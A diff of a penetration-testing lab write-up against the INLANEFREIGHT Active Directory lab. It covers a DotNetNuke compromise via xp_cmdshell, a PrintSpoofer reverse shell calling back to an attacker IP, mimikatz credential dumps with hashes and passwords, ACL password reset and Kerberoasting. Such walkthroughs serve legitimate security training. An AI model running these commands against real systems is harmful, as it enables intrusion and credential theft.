 |   Target_Name: INLANEFREIGHT
-|   NetBIOS_Domain_Name: INLANEFREIGHT
 |   NetBIOS_Computer_Name: ACADEMY-AEN-DEV
-|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
 |   DNS_Computer_Name: ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL
-|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
 |   Product_Version: 10.0.17763
-|_  System_Time: 2026-11-10T23:33:24+00:00
-|_ssl-date: 2026-11-10T23:33:29+00:00; +1h00m00s from scanner time.
 5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-title: Not Found
-|_http-server-header: Microsoft-HTTPAPI/2.0
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
 |_clock-skew: mean: 59m59s, deviation: 0s, median: 59m59s
 |_nbstat: NetBIOS name: ACADEMY-AEN-DEV, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:8a:12:09 (VMware)
-| smb2-security-mode: 
-|   3.1.1: 
-|_    Message signing enabled but not required
-| smb2-time: 
-|   date: 2026-11-10T23:33:24
-|_  start_date: N/A
+```
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 98.25 seconds
+bash
 
-
+```bash
+sudo nmap -sT -Pn 172.16.8.50 -sV -sC
 ```
 
 ```
- sudo nmap -sT -Pn 172.16.8.50 -sV -sC
-Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-10 17:03 -0500
 Nmap scan report for 172.16.8.50
 Host is up (0.043s latency).
-Not shown: 994 closed tcp ports (conn-refused)
 PORT     STATE SERVICE       VERSION
 135/tcp  open  msrpc         Microsoft Windows RPC
 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
 445/tcp  open  microsoft-ds?
 3389/tcp open  ms-wbt-server Microsoft Terminal Services
-| rdp-ntlm-info: 
+| rdp-ntlm-info:
 |   Target_Name: INLANEFREIGHT
-|   NetBIOS_Domain_Name: INLANEFREIGHT
 |   NetBIOS_Computer_Name: ACADEMY-AEN-MS0
-|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
 |   DNS_Computer_Name: ACADEMY-AEN-MS01.INLANEFREIGHT.LOCAL
-|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
 |   Product_Version: 10.0.17763
-|_  System_Time: 2026-11-10T23:03:27+00:00
-|_ssl-date: 2026-11-10T23:03:32+00:00; +1h00m00s from scanner time.
 | ssl-cert: Subject: commonName=ACADEMY-AEN-MS01.INLANEFREIGHT.LOCAL
-| Not valid before: 2026-11-09T19:42:07
-|_Not valid after:  2027-05-11T19:42:07
 5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-title: Not Found
-|_http-server-header: Microsoft-HTTPAPI/2.0
 8080/tcp open  http          Apache Tomcat (language: en)
 |_http-title: Apache Tomcat/10.0.21
-|_http-favicon: Apache Tomcat
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
 |_clock-skew: mean: 59m59s, deviation: 0s, median: 59m59s
-| smb2-security-mode: 
-|   3.1.1: 
-|_    Message signing enabled but not required
 |_nbstat: NetBIOS name: ACADEMY-AEN-MS0, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:8a:66:0a (VMware)
-| smb2-time: 
-|   date: 2026-11-10T23:03:27
-|_  start_date: N/A
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 15.51 seconds
-
-
 ```
 
-Adding the dc to the etc hosts file:
+`DC01` is added to the hosts file:
 
-```
+bash
+
+```bash
 echo "172.16.8.3 DC01.INLANEFREIGHT.LOCAL DC01" | sudo tee -a /etc/hosts
 ```
 
-## DEV01 (172.16.8.20)
+---
 
-Web enum discloses a dotnetnuke instance:
+## DEV01 (172.16.8.20) — DotNetNuke Exploitation
 
-![](./dev01/1.png)
+Web enumeration discloses a DotNetNuke (DNN) installation:
 
-mounting the nfsshare:
+./dev01/1.png
 
+The NFS export is mounted locally:
+
+bash
+
+```bash
+sudo mount -t nfs 172.16.8.20:/ ~/labs/aen/ -o nolock
 ```
-sudo mount -t nfs 172.16.8.20:/ ~/labs/aen/ -o nolock 
-```
 
-Enumerating the share reveals the credentials to access dotnetnuke as Admin in the `web.config` file:
-```
+bash
+
+```bash
 ┌──(kali㉿kali)-[~/labs/aen]
-└─$ ls
-DEV01
-                                                                                                                                                                                                                                    
-┌──(kali㉿kali)-[~/labs/aen]
-└─$ cd DEV01     
-                                                                                                                                                                                                                                    
-┌──(kali㉿kali)-[~/labs/aen/DEV01]
-└─$ ls
-BuildPackages.bat  CKEditorDefaultSettings.xml  CKToolbarButtons.xml  CKToolbarSets.xml  DNN  flag.txt  WatchersNET.CKEditor.sln
-                                                                                                                                                                                                                                    
-┌──(kali㉿kali)-[~/labs/aen/DEV01]
-└─$ cd DNN  
-                                                                                                                                                                                                                                    
+└─$ cd DEV01/DNN
 ┌──(kali㉿kali)-[~/labs/aen/DEV01/DNN]
-└─$ ls
-App_LocalResources  CKEditorOptions.ascx              CKEditorOptions.ascx.resx  Constants  Extensions  Objects          Options.aspx.designer.cs  UrlControl.ascx              Web               web.Deploy.config
-Browser             CKEditorOptions.ascx.cs           CKFinder                   Content    Install     Options.aspx     packages.config           Utilities                    web.config        web.Release.config
-bundleconfig.json   CKEditorOptions.ascx.designer.cs  CKHtmlEditorProvider.cs    Controls   Module      Options.aspx.cs  Properties                WatchersNET.CKEditor.csproj  web.Debug.config
-                                                                                                                                                                                                                                    
-┌──(kali㉿kali)-[~/labs/aen/DEV01/DNN]
-└─$ cat web.config   
+└─$ cat web.config
+```
+
+xml
+
+```xml
 <?xml version="1.0"?>
 <configuration>
-  <!--
-    For a description of web.config changes see http://go.microsoft.com/fwlink/?LinkId=235367.
-
-    The following attributes can be set on the <httpRuntime> tag.
-      <system.Web>
-        <httpRuntime targetFramework="4.6.2" />
-      </system.Web>
-  -->
   <username>Administrator</username>
   <password>
         <value>D0tn31Nuk3R0ck$$@123</value>
@@ -1391,17 +1123,18 @@ bundleconfig.json   CKEditorOptions.ascx.designer.cs  CKHtmlEditorProvider.cs   
     <compilation debug="true" targetFramework="4.5.2"/>
     <httpRuntime targetFramework="4.5.2"/>
   </system.web>
-</configuration>                                                                                                                                                  
+</configuration>
 ```
 
-Accessing as admin the dnn dashboard:
+Logging in as `Administrator` grants access to the admin dashboard ([DNN enumeration reference](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/dotnetnuke-dnn.html)):
 
-![](./dev01/2.png)
+./dev01/2.png
 
-Reference used to enumerate dotnetnuke:
-https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/dotnetnuke-dnn.html
+### Enabling xp_cmdshell
 
-By enabling the xp_cmdhsell its possible to execute commands:
+DNN's built-in SQL console is used to enable and invoke `xp_cmdshell`:
+
+sql
 
 ```sql
 EXEC sp_configure 'show advanced options', 1;
@@ -1412,40 +1145,41 @@ GO
 xp_cmdshell 'whoami';
 ```
 
-![](./dev01/3.png)
+./dev01/3.png
 
-running:
+Running `xp_cmdshell 'whoami /priv';` reveals the SQL service account holds `SeImpersonatePrivilege`:
 
-```sql
-xp_cmdshell 'whoami /priv';
-```
+./dev01/4.png
 
-reveals seimpersonateprivilege:
+### SeImpersonatePrivilege Abuse
 
-![](./dev01/4.png)
+`.exe` is added to the allowed upload extensions under **Settings → Security → More → More Security Settings**:
 
-adding the .exe estension to upload PrintSpoofer64.exe and nc64.exe
+./dev01/5.png
 
-**`Settings → Security → More → More Security Settings`**
+`PrintSpoofer64.exe` and `nc64.exe` are uploaded through **Admin → File Management**, landing under `C:\DotNetNuke\Portals\0`:
 
-![](./dev01/5.png)
+./dev01/6.png
 
-Browse to **`/admin/file-management`**
-uploading nc and printSpoofer
+`xp_cmdshell` is used to trigger PrintSpoofer with a reverse shell payload:
 
-![](./dev01/6.png)
+sql
 
-Trigger it at **`/Portals/0`**
 ```sql
 xp_cmdshell 'c:\dotnetnuke\portals\0\PrintSpoofer64.exe -c "c:\dotnetnuke\portals\0\nc64.exe 172.16.8.120 9001 -e cmd"';
 ```
 
-![](./dev01/7.png)
+./dev01/7.png
 
-Shell as nt authority:
+A shell as `nt authority\system` is received:
+
+bash
+
+```bash
+$ nc -lvnp 9001
+```
 
 ```
-$ nc -lvnp 9001
 Listening on 0.0.0.0 9001
 Connection received on 172.16.8.20 49841
 Microsoft Windows [Version 10.0.17763.107]
@@ -1454,237 +1188,120 @@ Microsoft Windows [Version 10.0.17763.107]
 C:\Windows\system32>whoami
 whoami
 nt authority\system
-
-C:\Windows\system32>
-
 ```
 
-## flag on dev01
+---
+
+## Flag (DEV01)
 
 ```
 c:\Users\Administrator\Desktop>dir
-dir
- Volume in drive C has no label.
- Volume Serial Number is DA7F-3F25
-
  Directory of c:\Users\Administrator\Desktop
-
-06/22/2022  08:05 PM    <DIR>          .
-06/22/2022  08:05 PM    <DIR>          ..
 06/22/2022  08:05 PM                17 flag.txt
-               1 File(s)             17 bytes
-               2 Dir(s)  31,527,854,080 bytes free
-
-c:\Users\Administrator\Desktop>cat flag.txt
-cat flag.txt
-'cat' is not recognized as an internal or external command,
-operable program or batch file.
 
 c:\Users\Administrator\Desktop>type flag.txt
 type flag.txt
 K33p_0n_sp00fing!
-c:\Users\Administrator\Desktop>
-
 ```
 
-## Credential harvesting
-
-mimikatz is uploaded on the host with the same technique and is used to dump the registry
+**Flag:**
 
 ```
-Directory of c:\DotNetNuke\Portals\0
+K33p_0n_sp00fing!
+```
 
-11/13/2026  09:50 AM    <DIR>          .
-11/13/2026  09:50 AM    <DIR>          ..
-06/01/2022  12:49 PM             9,569 home.css
-06/01/2022  12:49 PM    <DIR>          Images
-11/13/2026  09:50 AM         1,250,056 mimikatz.exe
-11/13/2026  09:39 AM            45,272 nc64.exe
-11/13/2026  09:39 AM            27,136 PrintSpoofer64.exe
-06/01/2022  12:49 PM    <DIR>          Templates
-06/01/2022  12:51 PM    <DIR>          Users
-               4 File(s)      1,332,033 bytes
-               5 Dir(s)  31,526,572,032 bytes free
+---
 
+## Credential Harvesting on DEV01
+
+`mimikatz.exe` is uploaded to `C:\DotNetNuke\Portals\0` and run as `nt authority\system`:
+
+bash
+
+```bash
 c:\DotNetNuke\Portals\0>.\mimikatz.exe
-.\mimikatz.exe
+```
 
-  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
- .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
- ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
- ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
- '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
-  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
-
-mimikatz # privilege::debug 
+```
+mimikatz # privilege::debug
 Privilege '20' OK
 
+mimikatz # lsadump::sam
 ```
 
 ```
-mimikatz # lsadump::sam
 Domain : ACADEMY-AEN-DEV
 SysKey : b3a720652a6fca7e31c1659e3d619944
 Local SID : S-1-5-21-4188713075-3040141756-4070027797
-
-SAMKey : 5b291799f8cf904e8b45c8a59a7ece3f
 
 RID  : 000001f4 (500)
 User : Administrator
   Hash NTLM: 0e20798f695ab0d04bc138b22344cea8
 
-Supplemental Credentials:
-* Primary:NTLM-Strong-NTOWF *
-    Random Value : 8e9d2160ace6313fd975f14028afc13c
-
-* Primary:Kerberos-Newer-Keys *
-    Default Salt : ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCALAdministrator
-    Default Iterations : 4096
-    Credentials
-      aes256_hmac       (4096) : 25b7ef9fb0d538b0ea5a5f8e5bb2dd4bd379825373097006085d9e0bc0b4a2bd
-      aes128_hmac       (4096) : e0cec3e285f849ceb9505c2a40933ba2
-      des_cbc_md5       (4096) : df2f7a2002cd9726
-    OldCredentials
-      aes256_hmac       (4096) : 2fb39f6a7cafb3a7d7a1898e322b316fbb782adf881a5158b5ee56a6fb2b0d09
-      aes128_hmac       (4096) : 56576ae9fbfa03a40a9fdeef3a28f300
-      des_cbc_md5       (4096) : 855b6ba2a17a4067
-    OlderCredentials
-      aes256_hmac       (4096) : 23cbc0dad348bebcbdbb4c82e9b23af299e8b56de358bafe24f2235f34497e4a
-      aes128_hmac       (4096) : e35eb565af30c8ed79df5d8875508df6
-      des_cbc_md5       (4096) : 4904021983252cd5
-
-* Packages *
-    NTLM-Strong-NTOWF
-
-* Primary:Kerberos *
-    Default Salt : ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCALAdministrator
-    Credentials
-      des_cbc_md5       : df2f7a2002cd9726
-    OldCredentials
-      des_cbc_md5       : 855b6ba2a17a4067
-
-
-RID  : 000001f5 (501)
-User : Guest
-
-RID  : 000001f7 (503)
-User : DefaultAccount
-
-RID  : 000001f8 (504)
-User : WDAGUtilityAccount
-
 RID  : 000003e9 (1001)
 User : mpalledorous
   Hash NTLM: 3bb874a52ce7b0d64ee2a82bbf3fe1cc
-
-Supplemental Credentials:
-* Primary:NTLM-Strong-NTOWF *
-    Random Value : ce7a5171bbe834124da91992ecda68c9
-
-* Primary:Kerberos-Newer-Keys *
-    Default Salt : ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCALmpalledorous
-    Default Iterations : 4096
-    Credentials
-      aes256_hmac       (4096) : 6bd17ff49d28241e0c66633b39a4914e5f502f387f8caa873bd11293f539de20
-      aes128_hmac       (4096) : 61352bc0ead58d7ddbb51118c3c4b2a5
-      des_cbc_md5       (4096) : a2a404dcd92375cb
-
-* Packages *
-    NTLM-Strong-NTOWF
-
-* Primary:Kerberos *
-    Default Salt : ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCALmpalledorous
-    Credentials
-      des_cbc_md5       : a2a404dcd92375cb
-
-
 ```
 
-```
+bash
+
+```bash
 mimikatz # lsadump::secrets
+```
+
+```
 Domain : ACADEMY-AEN-DEV
-SysKey : b3a720652a6fca7e31c1659e3d619944
-
-Local name : ACADEMY-AEN-DEV ( S-1-5-21-4188713075-3040141756-4070027797 )
-Domain name : INLANEFREIGHT ( S-1-5-21-2814148634-3729814499-1637837074 )
 Domain FQDN : INLANEFREIGHT.LOCAL
-
-Policy subsystem is : 1.18
-LSA Key(s) : 1, default {b9789de7-ed68-1526-12f5-08fc1ad2996f}
-  [00] {b9789de7-ed68-1526-12f5-08fc1ad2996f} c382f753c97d2798f34aa2c43c41ca6fdc8548a17eba53764e79a20550fed730
-
-Secret  : $MACHINE.ACC
-cur/hex : 1b 1e df 99 7b ec 38 e6 95 4c ba 10 ca 20 2f 1c 83 12 e2 27 df 0f b6 a8 d9 31 8e 17 30 c6 2b 01 ed c5 ed c6 4d 73 4c 71 fa 24 3c 85 40 82 bd 50 81 32 9d 54 9b 98 cf d0 db 61 66 b9 d1 e2 02 e5 19 8b e4 58 de 7f c5 05 d2 19 fa 97 5f 47 55 41 53 49 39 de 91 77 78 39 b8 99 b2 de 4b e9 69 a1 1c e0 7e 67 06 94 6d 07 a4 86 ab 0b c3 82 d7 e7 e8 d2 8c 56 f3 1b 49 f5 b3 a0 78 fd e0 62 a8 5c dd f9 56 3c 7b f1 ee 2e bb e1 fd 57 10 40 15 74 53 2d 96 6d 94 71 c1 a1 a7 e4 e5 79 e5 da ec f5 e2 fc ac 75 5d 32 5f e0 72 32 cb 37 90 7e c5 c1 b9 5c 40 a2 44 73 4b 50 f8 51 03 99 dc d4 a2 86 7b 67 7a 57 c4 c0 03 fc d4 88 db a4 ae d4 47 f3 05 a8 92 e0 37 a2 27 6f 51 af d9 61 85 a7 7e 58 17 93 fd 74 14 d4 a2 74 0e b6 0f cf 13 2d 26 ea 
-    NTLM:aea71d223774c11e71f96a6c162cdfba
-    SHA1:5d291faf670ee5e03b0f4aed499a2375ffb15007
-old/text: >& FZ0F!KFq.+MBPHE.l(xyXD;Pay3n*GAY n-9Y;5>w]_KI@QNbWDtk^u@Ia]`ac$f3<a+`93`jbVn>!vJ!4I;!$]Mg!QK.Or)'Lr0Vv'OU;UdaJiu2hT3l
-    NTLM:cb8a6327fc3dad4ea7c84b88c7542e7c
-    SHA1:7a235e5ec5d545d163d6c181383d3f043d4685c2
 
 Secret  : DefaultPassword
 cur/text: Gr8hambino!
 
-Secret  : DPAPI_SYSTEM
-cur/hex : 01 00 00 00 69 68 d5 0f 5e c2 bc 41 bc 20 7a 35 f0 39 2b 72 bb 08 3c 22 e1 e7 a8 bc 82 73 39 55 52 ae 8e 23 52 9a d8 74 0d 82 ea 92 
-    full: 6968d50f5ec2bc41bc207a35f0392b72bb083c22e1e7a8bc8273395552ae8e23529ad8740d82ea92
-    m/u : 6968d50f5ec2bc41bc207a35f0392b72bb083c22 / e1e7a8bc8273395552ae8e23529ad8740d82ea92
-old/hex : 01 00 00 00 dd 0a a3 03 f4 54 79 25 14 2b a9 35 5e c6 fb fc 73 af 4e 7f 34 43 f6 4e 38 01 81 de 9a 46 4c f4 b0 6d 50 ed 83 97 aa 5f 
-    full: dd0aa303f4547925142ba9355ec6fbfc73af4e7f3443f64e380181de9a464cf4b06d50ed8397aa5f
-    m/u : dd0aa303f4547925142ba9355ec6fbfc73af4e7f / 3443f64e380181de9a464cf4b06d50ed8397aa5f
-
-Secret  : NL$KM
-cur/hex : 21 0c e6 ac 8b 08 9b 39 97 ea d9 c6 77 db 10 e6 2e b2 53 43 7e b8 06 64 b3 eb 89 b1 da d1 22 c7 11 83 fa 35 db 57 3e b0 9d 84 59 41 90 18 7a 8d ed c9 1c 26 ff b7 da 6f 02 c9 2e 18 9d ca 08 2d 
-old/hex : 21 0c e6 ac 8b 08 9b 39 97 ea d9 c6 77 db 10 e6 2e b2 53 43 7e b8 06 64 b3 eb 89 b1 da d1 22 c7 11 83 fa 35 db 57 3e b0 9d 84 59 41 90 18 7a 8d ed c9 1c 26 ff b7 da 6f 02 c9 2e 18 9d ca 08 2d 
-
 Secret  : _SC_MSSQL$SQLEXPRESS / service 'MSSQL$SQLEXPRESS' with username : NT Service\MSSQL$SQLEXPRESS
-
-Secret  : _SC_SQLTELEMETRY$SQLEXPRESS / service 'SQLTELEMETRY$SQLEXPRESS' with username : NT Service\SQLTELEMETRY$SQLEXPRESS
-
-
 ```
 
-Looking for users:
+Local users on the host:
 
-```
+bash
+
+```bash
 dir c:\users
- Volume in drive C has no label.
- Volume Serial Number is DA7F-3F25
+```
 
+```
  Directory of c:\users
-
-06/01/2022  11:52 AM    <DIR>          .
-06/01/2022  11:52 AM    <DIR>          ..
-06/01/2022  11:03 AM    <DIR>          .NET v2.0
-06/01/2022  11:03 AM    <DIR>          .NET v2.0 Classic
-06/01/2022  11:03 AM    <DIR>          .NET v4.5
-06/01/2022  11:03 AM    <DIR>          .NET v4.5 Classic
 06/01/2022  12:03 PM    <DIR>          Administrator
-06/01/2022  11:03 AM    <DIR>          Classic .NET AppPool
-06/01/2022  10:28 PM    <DIR>          hporter
+06/22/2022  10:28 PM    <DIR>          hporter
 06/01/2022  11:54 AM    <DIR>          mpalledorous
 12/14/2020  06:30 PM    <DIR>          Public
-               0 File(s)              0 bytes
-              11 Dir(s)  31,526,375,424 bytes free
 ```
 
-Testing the discovered password on local users reveals that the password works on hporter:
+> [!note] `hporter` does not appear in the `lsadump::sam` output above, which only lists `Administrator` and `mpalledorous`; it is likely a domain account whose profile was cached locally rather than a local SAM entry.
 
-```
+---
+
+## BloodHound Enumeration
+
+The recovered `DefaultPassword` secret, `Gr8hambino!`, is valid for the domain user `hporter`:
+
+bash
+
+```bash
 nxc smb 172.16.8.3 -u hporter -p Gr8hambino! --shares
+```
+
+```
 SMB         172.16.8.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\hporter:Gr8hambino! 
+SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\hporter:Gr8hambino!
 SMB         172.16.8.3      445    DC01             [*] Enumerated shares
 SMB         172.16.8.3      445    DC01             Share           Permissions     Remark
-SMB         172.16.8.3      445    DC01             -----           -----------     ------
-SMB         172.16.8.3      445    DC01             ADMIN$                          Remote Admin
-SMB         172.16.8.3      445    DC01             C$                              Default share
 SMB         172.16.8.3      445    DC01             Department Shares READ            Share for department users
-SMB         172.16.8.3      445    DC01             IPC$            READ            Remote IPC
-SMB         172.16.8.3      445    DC01             NETLOGON        READ            Logon server share 
+SMB         172.16.8.3      445    DC01             NETLOGON        READ            Logon server share
 SMB         172.16.8.3      445    DC01             SYSVOL          READ            Logon server share
 ```
 
-## Bloodhound enumeration
+BloodHound data is collected using this account:
+
+bash
 
 ```bash
 sudo bloodhound-python -u 'hporter' -p 'Gr8hambino!' -ns 172.16.8.3 -d INLANEFREIGHT.LOCAL -c all --zip
@@ -1695,659 +1312,353 @@ INFO: Done in 03M 05S
 INFO: Compressing output into 20261113132230_bloodhound.zip
 ```
 
+---
 
-## ForcePasswordREset acl
+## ACL Abuse — ForceChangePassword
 
-![](./bh/1.png)
+Analysis of the collected data shows `hporter` holds `ForceChangePassword` over `ssmalls`:
 
-Changing ssmalls password:
+./bh/1.png
+
+The right is used to reset the password without knowing the current one:
+
+bash
 
 ```bash
-net rpc password "ssmalls" 'Password123!' -U "INLANEFREIGHT.LOCAL"/"hporter"%'Gr8hambino!' -S DC01 
+net rpc password "ssmalls" 'Password123!' -U "INLANEFREIGHT.LOCAL"/"hporter"%'Gr8hambino!' -S DC01
+```
+
+bash
+
+```bash
+nxc smb 172.16.8.3 -u 'ssmalls' -p 'Password123!' --shares
 ```
 
 ```
-                                                                                                                                                                                                                                    
-┌──(kali㉿kali)-[~/labs/aen]
-└─$ nxc smb 172.16.8.3 -u 'ssmalls' -p 'Password123!' --shares                                        
 SMB         172.16.8.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\ssmalls:Password123! 
+SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\ssmalls:Password123!
 SMB         172.16.8.3      445    DC01             [*] Enumerated shares
 SMB         172.16.8.3      445    DC01             Share           Permissions     Remark
-SMB         172.16.8.3      445    DC01             -----           -----------     ------
-SMB         172.16.8.3      445    DC01             ADMIN$                          Remote Admin
-SMB         172.16.8.3      445    DC01             C$                              Default share
 SMB         172.16.8.3      445    DC01             Department Shares READ            Share for department users
-SMB         172.16.8.3      445    DC01             IPC$            READ            Remote IPC
-SMB         172.16.8.3      445    DC01             NETLOGON        READ            Logon server share 
-SMB         172.16.8.3      445    DC01             SYSVOL          READ            Logon server share 
-
+SMB         172.16.8.3      445    DC01             NETLOGON        READ            Logon server share
+SMB         172.16.8.3      445    DC01             SYSVOL          READ            Logon server share
 ```
+
+---
 
 ## Kerberoasting
 
-```bash
-impacket-GetUserSPNs INLANEFREIGHT.LOCAL/ssmalls -dc-ip 172.16.8.3 -request -outputfile spn.hash 
-Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+`ssmalls` is used to request service tickets for every SPN account in the domain:
 
-Password:
-ServicePrincipalName                         Name          MemberOf  PasswordLastSet             LastLogon                   Delegation 
+bash
+
+```bash
+impacket-GetUserSPNs INLANEFREIGHT.LOCAL/ssmalls -dc-ip 172.16.8.3 -request -outputfile spn.hash
+```
+
+```
+ServicePrincipalName                         Name          MemberOf  PasswordLastSet             LastLogon                   Delegation
 -------------------------------------------  ------------  --------  --------------------------  --------------------------  ----------
-adfsconnect/azure01.inlanefreight.local      azureconnect            2022-06-01 14:32:56.506935  <never>                                
-backupjob/veam001.inlanefreight.local        backupjob               2022-06-01 14:33:00.038178  <never>                                
-MSSQLSvc/DB01.inlanefreight.local:1433       mssqlsvc                2022-06-01 14:32:31.178803  <never>                                
-MSSQLSvc/DEVTEST.inlanefreight.local:1433    sqltest                 2022-06-01 14:32:45.522556  <never>                                
-MSSQLSvc/QA001.inlanefreight.local:1433      sqlqa                   2022-06-01 14:32:49.256932  <never>                                
-MSSQLSvc/SQL-DEV01.inlanefreight.local:1433  sqldev                  2022-06-01 14:32:41.913173  <never>                                
-MSSQLSvc/SQL-WEB01.inlanefreight.local:1433  mssqladm                2022-06-01 14:32:52.897615  2022-06-23 00:45:20.688469             
-MSSQLSvc/SQL01.inlanefreight.local:1433      svc_sql                 2022-06-01 14:32:34.850677  <never>                                
-MSSQLSvc/SQL02.inlanefreight.local:1433      sqlprod                 2022-06-01 14:32:38.381946  <never>                                
-SAP/APP01.inlanefreight.local                sapsso                  2022-06-01 14:33:07.225672  <never>                                
-SAPsvc/SAP01.inlanefreight.local             sapvc                   2022-06-01 14:33:10.678799  <never>                                
+adfsconnect/azure01.inlanefreight.local      azureconnect            2022-06-01 14:32:56.506935  <never>
+backupjob/veam001.inlanefreight.local        backupjob               2022-06-01 14:33:00.038178  <never>
+MSSQLSvc/DB01.inlanefreight.local:1433       mssqlsvc                2022-06-01 14:32:31.178803  <never>
+MSSQLSvc/DEVTEST.inlanefreight.local:1433    sqltest                 2022-06-01 14:32:45.522556  <never>
+MSSQLSvc/QA001.inlanefreight.local:1433      sqlqa                   2022-06-01 14:32:49.256932  <never>
+MSSQLSvc/SQL-DEV01.inlanefreight.local:1433  sqldev                  2022-06-01 14:32:41.913173  <never>
+MSSQLSvc/SQL-WEB01.inlanefreight.local:1433  mssqladm                2022-06-01 14:32:52.897615  2022-06-23 00:45:20.688469
+MSSQLSvc/SQL01.inlanefreight.local:1433      svc_sql                 2022-06-01 14:32:34.850677  <never>
+MSSQLSvc/SQL02.inlanefreight.local:1433      sqlprod                 2022-06-01 14:32:38.381946  <never>
+SAP/APP01.inlanefreight.local                sapsso                  2022-06-01 14:33:07.225672  <never>
+SAPsvc/SAP01.inlanefreight.local             sapvc                   2022-06-01 14:33:10.678799  <never>
 vmware/vc.inlanefreight.local                vmwarescvc              2022-06-01 14:33:03.600665  <never>
 ```
 
-backupjob creds
+Only the `backupjob` ticket cracks against `rockyou.txt`:
 
- ```
-  hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
-hashcat (v7.1.2) starting
+bash
 
-OpenCL API (OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
-====================================================================================================================================================
-* Device #01: cpu-sandybridge-AMD Ryzen 7 5700G with Radeon Graphics, 1468/2937 MB (1468 MB allocatable), 4MCU
-
-Minimum password length supported by kernel: 0
-Maximum password length supported by kernel: 256
-Minimum salt length supported by kernel: 0
-Maximum salt length supported by kernel: 256
-
-Hashes: 12 digests; 12 unique digests, 12 unique salts
-Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
-Rules: 1
-
-Optimizers applied:
-* Zero-Byte
-* Not-Iterated
-
-ATTENTION! Pure (unoptimized) backend kernels selected.
-Pure kernels can crack longer passwords, but drastically reduce performance.
-If you want to switch to optimized kernels, append -O to your commandline.
-See the above message to find out about the exact limits.
-
-Watchdog: Temperature abort trigger set to 90c
-
-Host memory allocated for this attack: 513 MB (1786 MB free)
-
-Dictionary cache hit:
-* Filename..: /usr/share/wordlists/rockyou.txt
-* Passwords.: 14344385
-* Bytes.....: 139921507
-* Keyspace..: 14344385
-
-$krb5tgs$23$*backupjob$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/backupjob*$f7d4201e3999e2e43ccec8218a8ba597$5f03453046a5de9c320efe321e60f549b6b1bc2cd1dbf954939bc57ceaddae689180f037fe0290dbcc895fb321c87fed6d3361f49c6e4617b66a7dde56509942f808afa97d0b5941d77787f578a1c9e1683d85b187fbf63caf96b441671cae0dc003d5fe7dc9ab0b42b9f984dfc8aaa87826e9b6d04b85ae8ca311b9958f9a765b1ba0f04b1199b86e340898d90f50ad4478c3bfa4833401a09fc6b03c8a3c4f8dc4c9a7233eaca54e0d96ea51b4d7b562d4b66edd3b33abfcb305dc3a0913f20751db1d9d9b96ee55e69b7de2226d106be60b42f957323caadedd1a1dc9bef4a12f6091e69da8b3004e151762b7976126230c34f6d0ea6f68e66a3791090a8a05569cb4de3a231f512b160fae1125e2633fa8a95975f77d9be282d123857088d9c18cb3673948226daa07a031d7f394d37548124ece3a367f3f4c761b73b5e0a67145d7bf3ea2d08527bc8b6494533afb6f0632b449a32303b70c9abda1ce7c47e5c7bacb1e5495ad96a7e34bca910e6077d1837dd0b1cac07959648bd6d3379ab138e060aea63e9303b910b0874d5a79b2606f2ae529dcda802a32edc41b236a93fc5a5fd8354b660204811a4118f9ec4c830bb208bc3f757fa44856644b3124423d3df64377c08db65f9f3abc0ec66b0ee3c4a240e84d38e4cf28627059202896f0cbfe7c6f3796ec47c121ab65bda3584011029867fe9857dfd64f5b23b94427efdc5a4af7c40cea79328fc496645a513093a35a100258a4a689741e3f155e1e1bf282d7ca9bd731718d8216928d3287853e415e0139182e544164961c5f84717e375a47553816aaaea82e54ab46499c6e7dc9f24d16dad0fbc54855121d130221bf6135d7dbf65809154493ece1f772c6a0c99c8b92e14a766484377bd038d5ec6fb83d1309716298f17a92bbd0b9d871041a56e39910d127ee0ad1b8829da4bfa1253f307f8ff3d8b5ae2a27cc27ef7b664e3a0fbadc261c2ac7bd1f742cd30cf64d7a4e0c8584055d4c53a3ffa35439429c7b486848c0094e279f4f36c6e572d91f6abd1c6c7307749aeff96caa81a56f0efcbe090036388d